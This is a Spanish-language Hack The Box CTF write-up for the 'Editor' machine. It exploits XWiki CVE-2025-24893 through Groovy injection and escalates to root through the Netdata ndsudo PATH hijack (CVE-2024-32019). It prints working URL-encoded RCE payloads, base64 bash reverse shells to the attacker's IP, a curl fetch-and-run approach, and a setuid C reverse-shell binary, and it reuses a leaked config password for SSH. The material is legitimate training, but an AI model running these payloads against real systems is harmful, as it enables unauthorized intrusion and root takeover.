---
tags:
  - CTF
  - estado/completo
  - Credentials-Leakage
  - Linux
  - CVE-2024-32019
  - CVE-2025-24893
  - Netdata
  - XWiki
plataforma: "[[Hack The Box]]"
web:
  - editor.htb
  - wiki.editor.htb
dificultad: Fácil
---


> [!INFO] Introducción
>  Editor es una máquina Linux de dificultad `Easy` en HackTheBox donde debemos vulnerar el servicio web `XWiki` para ganar acceso inicial. Enumeración básica del sistema y un CVE en la herramienta `ndsudo` nos permitirán obtener control completo sobre Editor.
^descripcion

> [!FAQ]- Pistas
> #tutorial : ayuda que se proporcione y se quiera añadir al *writeup*.
> Este *callout* siempre aparece plegado por defecto.
^pistas

# Reconocimiento

---

Enviaremos una traza ICMP para comprobar que la máquina objetivo es alcanzable desde nuestro computador.

``` shell
❯ ping -c 3 10.10.11.80
PING 10.10.11.80 (10.10.11.80) 56(84) bytes of data.
64 bytes from 10.10.11.80: icmp_seq=1 ttl=63 time=142 ms
64 bytes from 10.10.11.80: icmp_seq=2 ttl=63 time=98.2 ms
64 bytes from 10.10.11.80: icmp_seq=3 ttl=63 time=95.8 ms

--- 10.10.11.80 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2008ms
rtt min/avg/max/mdev = 95.824/112.054/142.116/21.279 ms
```

## Nmap Scanning

Realizaremos un escaneo inicial para determinar los puertos abiertos en la máquina objetivo. En este caso, como estamos en un entorno controlado, podemos utilizar parámetros como `--min-rate 5000` para mandar una gran cantidad de paquetes y agilizar el escaneo. 

``` shell
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.80 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-11 19:27 -05
Nmap scan report for 10.10.11.80
Host is up (0.10s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE                                                             
22/tcp   open  ssh                                                                 80/tcp   open  http                                                                8080/tcp open  http-proxy                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds 
```

- `--open`: Mostrar únicamente puertos abiertos
- `-p-`: Hacer un escaneo a todos los puertos (65535)
- `--open`: Sólo mostrar puertos abiertos
- `-sS`: Modo de escaneo Stealth Scan (Escaneo TCP SYN. No concluye la conexión del three way handshake, por lo que es más rápido)
- `--min-rate`: Enviar mínimo 5000 paquetes por segundo
- `-n`: No aplicar resolución DNS, lo que acelera el escaneo
- `-Pn`: Omitir el descubrimiento de Hosts (ARP)
- `-oG`: Crea un archivo `grepeable` con la información del escaneo

Se puede ver que está corriendo un servicio SSH en el puerto 22, lo que nos da una herramienta para posteriores etapas en las que se pueden probar contraseñas obtenidas para hacer movimiento laterales, o de intrusión al sistema. También dos servicios http corriendo en el puerto 80 y 8080, lo que nos permitirá analizar la página web, e identificar la superficie de ataque.

Una vez identificados los puertos abiertos en los que se está ejecutando un servicio, podemos realizar un escaneo para determinar las versiones e investigar si existe una vulnerabilidad en las versiones específicas.

``` shell
❯ nmap -p 22,80,8080 -sCV 10.10.11.80 -oN services
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-11 19:44 -05
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

## Web Analysis

Al usar la dirección IP de la máquina objetivo en un navegador se nos intenta redirigir al dominio `editor.htb`, por lo que agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para que se pueda resolver correctamente el redireccionamiento de la IP al nombre de dominio.

``` shell
> echo "10.10.11.80    editor.htb" | sudo tee -a /etc/hosts
```

Al visitar la página de nuevo podemos encontrar el inicio donde podemos descargar una archivo .deb. La página es sobre un editor de código.

![[HTB-Editor-MainPage.png]]

Al entrar en el apartado  `Docs` se nos redirige a un subdominio `wiki.editor.htb`, por lo que tenemos que añadir este subdominio en el archivo `/etc/hosts` para que los resuelva correctamente.

``` shell
❯ cat /etc/hosts | grep editor
10.10.11.80    editor.htb wiki.editor.htb
```

Recargando la página tenemos que en este subdominio está corriendo una aplicación llamada `xwiki` y en el footer de la página se encuentra la versión de la aplicación que es `XWiki Debian 15.10.8`. 

> [!Info] XWiki
> [`XWiki`](https://xwiki.com/en/) es una plataforma wiki de código abierto escrita en Java, que permite a los usuarios crear, colaborar y organizar información en línea.

![[HTB-Editor-XWiki.png]]

# Análisis de vulnerabilidades

Tras una búsqueda en fuentes de información se encuentra que XWiki tiene vulnerabilidad clasificada como `CVE-2025-24893: Remote code execution as guest via SolrSearchMacros request in xwiki`. 
Esta vulnerabilidad en XWiki permite la ejecución de comandos en el servidor **sin necesidad de autenticación previa**. La vulnerabilidad consiste en la posibilidad de inyectar código `Groovy` en plantillas (templates) de `xwiki` enviando una solicitud `SolrSearch`.

## Understanding the vulnerability

Al buscar en [`CVEDetails`](https://www.cvedetails.com/cve/CVE-2025-24893/) podemos encontrar los rangos de versiones de la aplicación que podrían ser vulnerables a este exploit. En nuestro caso nos es relevante el intervalo comprendido entre la versión `5.3-milestone-2` y las anteriores a `15.10.11` ya que la versión de aplicación es `15.10.8` que se encuentra en el intervalo. 

![[HTB-Editor-VulnInterval.png]]

>[!Info] Más información
>Para una información más a detalle podemos ver la siguiente entrada de OffSec [aquí](https://www.offsec.com/blog/cve-2025-24893/).

Según el artículo se puede inyectar código ejecutable a través de una solicitud GET al endpoint vulnerable a través de un query parameter llamado `search`. Este sería un ejemplo de un endpoint vulnerable 

```shell
GET /xwiki/bin/view/Main/SolrSearchMacros?search=... (con código Groovy embebido)
```

Esto permite [[RCE]] (Remote Code Execution) a nivel de comandos de sistema, permitiendo crear archivos o iniciar procesos.
# Explotación de vulnerabilidades

Se puede hacer la explotación en un proceso de 3 pasos:
1. Crear código Groovy injectable con comandos de sistema
2. Mandar la petición GET al macro (endpoint vulnerable) ```
```shell
curl "http://<target>/xwiki/bin/view/Main/SolrSearchMacros?search=groovy:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')"
```
3.  Obtener ECR (RCE, ejecución remota de código) a través del código Groovy inyectado

Se pueden buscar PoC que exploten esta vulnerabilidad.

>[!Tip] Explotación con [[PoC]]
> Existe una prueba de concepto en GitHub para explotar esta vulnerabilidad [aquí](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py).

La solicitud HTTP cierra cualquier plantilla abierta con las llaves de cierre `}}}` e inyecta nueva lógica Groovy en una plantilla nueva.

Al analizar el script de la PoC se puede encontrar el siguiente URL con el payload con URL encoding:

```python
 f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

Donde el payload está en el parámetro de url `&text=<payload>`.
Que si se quiere ver descodificado se vería de esta manera:

```
}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}
```

Lo que es particularmente útil para la explotación es saber que los caracteres `%22` son la codificación de las comillas dobles, por lo que en este payload los comandos deben estar entre comillas dobles, o entre `%22` si está codificada en URL encoding. Si modificamos el payload para que la máquina objetivo nos mande trazas ICMP a través de `ping` podemos ver si hay ejecución remota de comandos.
El payload modificado y codificado en URL encoding es el siguiente:

``` Payload
%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22ping%20-c%202%2010.10.16.71%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

Y el request completo, con la solicitud GET, es el siguiente:

```shell
❯ curl -X GET "http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22ping%20-c%202%2010.10.16.71%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
```
- `-X GET`: Petición HTTP GET

Para analizar el tráfico de red y notar estas trazas ICMP enviadas por el servidor vamos a usar `tcpdump` como sniffer de tráfico de red.

```shell
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:59:10.944389 IP 10.10.11.80 > 10.10.16.71: ICMP echo request, id 1, seq 1, length 64
21:59:10.944440 IP 10.10.16.71 > 10.10.11.80: ICMP echo reply, id 1, seq 1, length 64
21:59:11.908148 IP 10.10.11.80 > 10.10.16.71: ICMP echo request, id 1, seq 2, length 64
21:59:11.908170 IP 10.10.16.71 > 10.10.11.80: ICMP echo reply, id 1, seq 2, length 64
21:59:12.018921 IP 10.10.11.80 > 10.10.16.71: ICMP echo request, id 2, seq 1, length 64
21:59:12.018941 IP 10.10.16.71 > 10.10.11.80: ICMP echo reply, id 2, seq 1, length 64
21:59:13.017055 IP 10.10.11.80 > 10.10.16.71: ICMP echo request, id 2, seq 2, length 64
21:59:13.017075 IP 10.10.16.71 > 10.10.11.80: ICMP echo reply, id 2, seq 2, length 64
```
- `-i`: Seleccionar la interfaz de red. Al usar una VPN se usa la interfaz tun0. Se puede verificar con el comando `ip a`.
- `-n`: Mostrar la dirección IP de la máquina objetivo y no el dominio.

>[!Bug] Problema con comandos complejos
>Sin embargo, si queremos realizar comandos más complejos como el siguiente para obtener una shell reversa, no va a funcionar.
>``` shell
bash -c 'bash -i >& /dev/tcp/<ip-máquina-atacante>/<puerto-para-recibir-conexión> 0>&1'
>```

`xwiki` espera que las plantillas tengan cierta estructura XML/HTML válida, entonces el payload debe ser cuidadosamente construido para no romper la plantilla original ni causar errores de `parsing`.

## Exploiting

Para evitar problemas con espacios y caracteres especiales en `Groovy` debemos usar llaves (`{cmd,arg1,arg2}`) .

>[!Tip]+ Para evitar problemas por caracteres especiales
>Para evitar problemas por caracteres especiales podemos codificar el string con el comando (en este caso la reverse shell) en `base64`.
>Esto se puede realizar de la siguiente manera:
>``` shell
>echo "bash -i >& /dev/tcp/<ip-máquina-atacante>/<puerto-para-recibir-conexión> 0>&1" | base64
>```

De esta manera podemos fabricar el siguiente payload, que envía la shell reversa codificada, la decodifica, y la ejecuta en una sesión de bash interactiva (flag `-i`).

```shell
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43MS80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}
```

Encapsularemos este payload sucedido de `bash -c` para lograr ejecutar los comandos correctamente. El payload sin URL encoding se vería de la siguiente manera:

```shell
}}}{{async async=false}}{{groovy}}println("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43MS80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}".execute().text){{/groovy}}{{/async}}
```

Y en URL encoding junto al resto de la URL:

```shell
> curl -s "http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7b%61%73%79%6e%63%20%61%73%79%6e%63%3d%66%61%6c%73%65%7d%7d%7b%7b%67%72%6f%6f%76%79%7d%7d%70%72%69%6e%74%6c%6e%28%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%33%4d%53%38%30%4e%44%4d%67%4d%44%34%6d%4d%51%6f%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%2e%65%78%65%63%75%74%65%28%29%2e%74%65%78%74%29%7b%7b%2f%67%72%6f%6f%76%79%7d%7d%7b%7b%2f%61%73%79%6e%63%7d%7d"
```

>[!Caution] Antes de codificar el payload e implementarlo
>Antes de utilizar el payload debemos recibir la conexión a través del puerto especificado. Se puede recibir la conexión con `Netcat` de la siguiente manera:
>```shell
>> nc -lvnp <puerto>
>```
>En este caso la conexión se hace al puerto `443`, porque en el payload se definió este puerto para establecer la conexión.

>[!Info]- Forma alternativa para obtener la sesión
> Podemos crear una bash shell, como lo hicimos anteriormente, en un archivo, servir este archivo en un servidor con Python, y descargarlo a través de la URL mandando el comando con `curl` para hacer que el servidor descargue el archivo que estamos sirviendo con nuestro servidor de Python. Posteriormente, podemos mandar una petición URL en la que le pidamos al servidor que ejecute ese archivo con la shell reversa.
> El proceso sería de esta manera:
> 1) Creamos un archivo en una carpeta que vamos a exponer en el servidor web. Por ejemplo, llamado `reverse_shell`, y con el siguiente contenido:
>  ```bash
>  #!/bin/bash
>
>  bash -i >& /dev/tcp/<ip-máquina-atacante>/<puerto-para-recibir-conexión> 0>&1
> ```
> 2) Exponemos este servidor con python escribiendo el comando `python -m http.server <puerto>`(el puerto 8000 podría ser una opción).
> 3) Podemos crear y enviar un payload (usando la sintaxis apropiada, y codificándolo en URL) que tenga el siguiente comando `curl http://<ip-máquina-atacante>/<archivo-con-reverse-shell> -o /dev/shm/<archivo-con-reverse-shell>`.
> 4)  Creamos otro payload en donde usemos el siguiente comando `bash /dev/shm/<archivo-con-reverse-shell>`.
> 5) Usamos Netcat para obtener la sesión en el `<puerto-para-recibir-conexión>` que definimos en el paso 1. 
> 6) Mandamos el payload del paso 4.

>[!Success] ¡Sesión de shell obtenida!
>Podemos ver que obtuvimos la sesión del usuario xwiki en la máquina objetivo.
>```
>❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.71] from (UNKNOWN) [10.10.11.80] 60804
bash: cannot set terminal process group (1009): Inappropriate ioctl for device
bash: no job control in this shell
xwiki@editor:/usr/lib/xwiki-jetty$   
>```
>>[!Tip] Mejorar la terminal obtenida (TTY Treatment)
>>Como obtuvimos una pseudo terminal sería ideal mejorarla para facilitar los procesos de la siguiente etapa, al poder usar `Ctrl+L` para limpiar la consola, o `Ctrl+C` para mandar una señal para interrumpir un proceso sin que se cierre la sesión, y poder ajustar las proporciones de la terminal.
>> ```shell
>> xwiki@editor:/usr/lib/xwiki-jetty$ script /dev/null -c bash
>>script /dev/null -c bash
>>Script started, output log file is '/dev/null'.            
>>xwiki@editor:/usr/lib/xwiki-jetty$ ^Z                      
>>[1]  + 3364 suspended  nc -lvnp 443                        
>>❯ stty raw -echo; fg
>>[1]  + 3364 continued  nc -lvnp 443
>>                                 reset
>>reset: unknown terminal type unknown
>>Terminal type? screen
>>xwiki@editor:/usr/lib/xwiki-jetty$ export TERM=xterm
>>xwiki@editor:/usr/lib/xwiki-jetty$ stty rows <#-de-filas> columns <#-de-columnas>
>>(Como referencia se pueden ver estos parámetros en la máquina atacante con el comando stty -a)
>> ```
# Escalada de privilegios

En este punto nos encontramos dentro de la máquina con un usuario (`xwiki`) que no dispone de privilegios suficientes para realizar operaciones administrativas.

Nuestro objetivo es convertirnos en el usuario `root`, sin embargo, es posible que necesitemos **migrar a otro usuario** primero, es por eso que realizaremos una **enumeración básica del sistema** para descubrir vías potenciales para elevar nuestros privilegios

## Enumeration

Inicialmente podemos ver a los usuarios del sistema revisando el archivo `passwd` en el path `/etc/passwd`.

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ cat /etc/passwd | grep -E "sh$"

root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

Podemos ver que hay dos usuarios en la máquina objetivo: `oliver` y `root`. Posiblemente podamos hacer pivoting desde `oliver` a `root` si iniciamos sesión con `oliver` y tiene más capacidades que nuestro usuario actual.
Algo importante a tener en cuenta es que en la máquina tenemos [[SSH]] en el puerto 22, por lo que una forma de escalar privilegios podría ser encontrando información sensible en los archivos de configuración de la aplicación.

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ find / -name "xwiki" 2>/dev/null

/etc/xwiki
/var/lib/xwiki
/var/lib/xwiki/data/store/file/xwiki
/var/log/xwiki
/usr/lib/xwiki
/usr/lib/xwiki/resources/js/xwiki
/usr/lib/xwiki/resources/icons/xwiki
/usr/lib/xwiki-jetty/webapps/xwiki
/usr/lib/xwiki-jetty/webapps/root/WEB-INF/classes/com/xpn/xwiki
/usr/share/xwiki
```

Al listar la carpeta `/etc/xwiki` podemos ver el siguiente output:

```
xwiki@editor:/etc/xwiki$ ls

cache                           jetty-ee8-web.xml  version.properties
extensions                      jetty-web.xml      web.xml
fonts                           logback.xml        xwiki.cfg
hibernate.cfg.xml               observation        xwiki-locales.txt
hibernate.cfg.xml.ucf-dist      portlet.xml        xwiki.properties
jboss-deployment-structure.xml  sun-web.xml        xwiki-tomcat9.xml
```

>[!Info] [[Hibernate]] 
>Hibernate es un ORM (mapea el lenguaje de programación/framework a la BBDD) de Java.

Podemos analizar el contenido de este fichero para ver si hay alguna contraseña en texto plano.

```shell
xwiki@editor:/etc/xwiki$ cat hibernate.cfg.xml | grep -E "pass|password|passwd"
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

Aparentemente hay una contraseña visible con el valor de `th*******`. Podemos hacer una búsqueda un poco más extensa para ver si hay usuarios asociados a la contraseña, y si podemos encontrar pistas del modelo de base de datos usado.

```shell
xwiki@editor:/etc/xwiki$ cat hibernate.cfg.xml | grep -E "url|usename|user|pass|password|passwd"                   
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>                                                                                  
    <property name="hibernate.connection.username">xwiki</property>                                                      
    <property name="hibernate.connection.password">th********</property>                                            
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false</property>                       
    <property name="hibernate.connection.username">xwiki</property>                                                      
    <property name="hibernate.connection.password">xwiki</property>                                                      
    <property name="hibernate.connection.url">jdbc:mariadb://localhost/xwiki?useSSL=false</property>                     
    <property name="hibernate.connection.username">xwiki</property>                                                      
    <property name="hibernate.connection.password">xwiki</property>                                                      
    <property name="hibernate.connection.url">jdbc:hsqldb:file:${environment.permanentDirectory}/database/xwiki_db;shutdown=true</property>                                                                                                       
    <property name="hibernate.connection.username">sa</property>                                                         
    <property name="hibernate.connection.password"></property>                                                           
    <property name="hibernate.connection.url">jdbc:postgresql://localhost:5432/xwiki</property>                          
    <property name="hibernate.connection.username">xwiki</property>                                                      
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.url">jdbc:oracle:thin:@localhost:1521:XE</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.url">jdbc:derby:/some/path/xwikidb;create=true</property>
    <property name="hibernate.connection.url">jdbc:h2:${environment.permanentDirectory}/database/xwiki</property>
    <property name="hibernate.connection.username">sa</property>
    <property name="hibernate.connection.password"></property>

```

Aparentemente el motor de base datos es mySQL.  Podemos conectarnos a la base de datos con el siguiente comando, y con la contraseña `th******` cuando se nos pida, sin embargo, no hay mucha información útil en la base de datos.

```shell
xwiki@editor:/etc/xwiki$ mysql --user=xwiki -p xwiki
```

Con esta contraseña podemos intentar iniciar sesión en `SSH` ya sea como el usuario `root`, o como el usuario `oliver`. 

>[!Success] ¡Acceso al usuario Oliver!
> Al realizar la conexión con SSH (con el comando `ssh oliver@10.10.11.80` y la contraseña `th******`) se inició sesión correctamente.
> En el directorio home (`~`) se encuentra la **flag** del usuario. 

## Oliver user

En este punto somos el usuario `oliver`, necesitamos y tenemos que encontrar una forma de escalar privilegios para convertirnos en `root`. 

Es una buena práctica ver los grupos a los que pertenece el usuario para apalancarse en sus permisos y escalar los privilegios.

```shell
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

El usuario pertenece al grupo `netdata` que parece ser una aplicación. Podría ser una fuente de vulnerabilidades si conocemos su versión y su uso.
### Sudoers privileges

Si listamos la capacidad del usuario para ejecutar recursos como otro usuario, nos damos cuenta de que el usuario `oliver` no puede usar `sudo`.

``` shell
oliver@editor:~$ sudo -l
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### SUID Binaries

Realizaremos una enumeración básica de permisos `SUID`, este permiso te permite ejecutar un binario como el propietario del recurso.

Sabiendo esto, podríamos aprovechar alguna opción del binario que nos permita ejecutar un comando y así realizar acciones privilegiadas.

Encontraremos una herramienta en la ruta `/opt` llamada `netdata`.

```shell
oliver@editor:~$ find / -perm -4000 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network                          
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin                   
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners                         
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo                                  
/opt/netdata/usr/libexec/netdata/plugins.d/ioping                                  
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin                           
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin                             
/usr/bin/newgrp                                                                    
/usr/bin/gpasswd                                                                   
/usr/bin/su                                                                        
/usr/bin/umount                                                                    
/usr/bin/chsh                                                                      
/usr/bin/fusermount3                                                               
/usr/bin/sudo                                                                      
/usr/bin/passwd                                                                    
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

>[!Tip]- Otra alternativa
>Adicionalmente, podemos ver los puertos que están escuchando para ver servicios internos:
>
>```shell
oliver@editor:~$ ss -tnl
State        Recv-Q       Send-Q                  Local Address:Port               Peer Address:Port       Process       
LISTEN       0            4096                        127.0.0.1:45539                   0.0.0.0:*                        
LISTEN       0            70                          127.0.0.1:33060                   0.0.0.0:*                        
LISTEN       0            4096                    127.0.0.53%lo:53                      0.0.0.0:*                        
LISTEN       0            128                           0.0.0.0:22                      0.0.0.0:*                        
LISTEN       0            511                           0.0.0.0:80                      0.0.0.0:*                        
LISTEN       0            151                         127.0.0.1:3306                    0.0.0.0:*                        
LISTEN       0            4096                        127.0.0.1:19999                   0.0.0.0:*                        
LISTEN       0            4096                        127.0.0.1:8125                    0.0.0.0:*                        
LISTEN       0            50                                  *:8080                          *:*                        
LISTEN       0            128                              [::]:22                         [::]:*                        
LISTEN       0            511                              [::]:80                         [::]:*                        
LISTEN       0            50                 [::ffff:127.0.0.1]:8079                          *:*                    
>```
>
>En donde podemos notar servicios corriendo en `localhost` en los puertos 45539, 33060, 3306, 19999 y 8125. El puerto 3306 suele ser el puerto para `mysql`, y probablemente el puerto 33060 esté relacionado, pero los otros puertos resultan interesantes, y probablemente esté corriendo el programa `netdata` en alguno de estos puertos.

En la aplicación nos llama la atención que el nombre `ndsudo`, porque recuerda al comando `sudo`. Por lo que se realiza una búsqueda acerca de su uso.

>[!Info] ndsudo
>**`ndsudo`** es una herramienta que viene con `Netdata Agent`, permite que `Netdata` ejecute ciertos comandos que requieren privilegios sin necesidad de usar `sudo` tradicional.
>El NIST lo define como:
>>[!Cite] NIST 
>>Netdata is an open source observability tool. In affected versions the `ndsudo` tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions. The `ndsudo` tool is packaged as a `root`-owned executable with the SUID bit set. It only runs a restricted set of external commands, but its search paths are supplied by the `PATH` environment variable. This allows an attacker to control where `ndsudo` looks for these commands, which may be a path the attacker has write access to. This may lead to local privilege escalation. This vulnerability has been addressed in versions 1.45.3 and 1.45.2-169. Users are advised to upgrade. There are no known workarounds for this vulnerability.

Al hacer la búsqueda se encuentra que hay una vulnerabilidad de escalada de privilegios [CVE-2024-32019](https://www.cvedetails.com/cve/CVE-2024-32019/) asociada con este archivo de la aplicación. Para saber si la aplicación en la máquina objetivo es vulnerable tenemos que conocer su versión.

```shell
oliver@editor:~$ /opt/netdata/bin/netdata -v

netdata v1.45.2
```

En este enlace [ndsudo: local privilege escalation via untrusted search path · Advisory · netdata/netdata · GitHub](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) se habla un poco sobre la vulnerabilidad, y una PoC para aprovecharla.
De manera resumida, ndsudo busca el ejecutable de sus comandos disponibles desde la variable de entorno PATH, por lo que se puede crear un archivo con código malicioso para sea ejecutado por el comando de ndsudo cuando lo busque en la variable de entorno PATH.

Al usar el comando de ayuda para la utilidad se obtiene

```shell
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

Se puede ver que hay 6 comandos en el que cada uno usa un binario específico y tiene parámetros. Si corremos el programa con el parámetro `--test` podemos ver que no hay un binario de nvme, entonces podemos crearlo y el programa ndsudo lo ejecutará con los permisos de root.

```shell
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list --test

nvme : not available in PATH.
```

### Proof of Concept (PoC)

Podemos escribir un pequeño programa en C que se encargue de darnos el `uid` del usuario `root`. El programa se nombra `root.c` y se crea en la máquina atacante. 

```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {
  printf("[*] Exploiting CVE-2024-32019...\n");
  setuid(0);
  system("bash -c 'bash -i >& /dev/tcp/10.10.16.71/445 0>&1'");
  return 0;
}
```

Este código  asigna el valor de 0 al `uid`. Este valor es el valor de identificación de usuario para root, y luego direcciona una shell reversa al puerto `445`, considerando que esta shell es de root al ya haber asignado el `uid` correspondiente.
Ya que el `ndsudo` busca un binario con el nombre `nvme` elegimos la opción en el compilador de C para que el binario de salida tenga dicho nombre.

```shell
gcc root.c -o nvme
```

Una vez tenemos el binario malicioso, podemos servirlo a través de un servidor de Python simple con el comando `python -m http.server 8000`, y descargar el archivo desde la máquina objetivo:

```shell
oliver@editor:~$ wget 10.10.16.71:8000/nvme

--2025-12-13 02:20:36--  http://10.10.16.71:8000/nvme
Connecting to 10.10.16.71:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16056 (16K) [application/octet-stream]
Saving to: ‘nvme’

nvme                           100%[=================================================>]  15.68K  54.7KB/s    in 0.3s    

2025-12-13 02:20:37 (54.7 KB/s) - ‘nvme’ saved [16056/16056]
```

Le asignamos permisos de ejecución al binario recién descargado en la máquina objetivo

```shell
oliver@editor:~$ chmod +x nvme
```

Ya que el programa está habilitado en la máquina objetivo, tenemos que hacer que el programa `ndsudo` sepa dónde encontrar el binario. Como sabemos que el programa busca en la variable de entorno `PATH` lo agregamos a ésta, no sin antes poner `Netcat` a escuchar en el puerto `445` de la máquina atacante que fue definido en el payload.

```Shell
[Máquina atacante]
> nc -lvnp 445
```

```shell
[Máquina objetivo]
oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

>[!Success] ¡Acceso al usuario root!
>De esta manera tenemos la sesión de root, vamos al directorio home de root, y  obtenemos la **flag** de root.
>```shell
>root@editor:/home/oliver# ls /root/     
>ls /root/
>
>root.txt
